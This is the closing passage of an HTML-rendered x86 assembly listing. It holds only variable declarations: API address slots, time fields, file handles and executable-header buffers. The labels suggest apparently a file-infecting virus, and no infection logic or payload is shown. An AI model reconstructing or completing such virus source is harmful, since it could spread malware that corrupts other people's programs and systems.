</span><span class="sc5">findnext_a</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">findclose_a</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">loadlibrary_a</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">glocaltime_a</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">api_addr_end</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">time_table</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">system_year</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_month</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_week</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_day</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_hour</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_minute</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_second</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_milsec</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time_table_end</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">crfhandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">srchandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">max_path_size</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">finddata</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">winexe_data</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">winexe_offset</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">align_shift</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">newexe_size</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">last_newexe</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lseek_newexe</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lseek_add</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">stupid_face</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">''</span><span class="sc0">        </span><span class="sc1">; Ain't it charming? :)</span><span class="sc0">

</span><span class="sc5">file_or_mem</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F'</span><span class="sc0">
</span><span class="sc5">file_offset</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dot_xy</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rawdata_ptr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">thunk_offset</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">old_exe_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">espo_mem_end</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
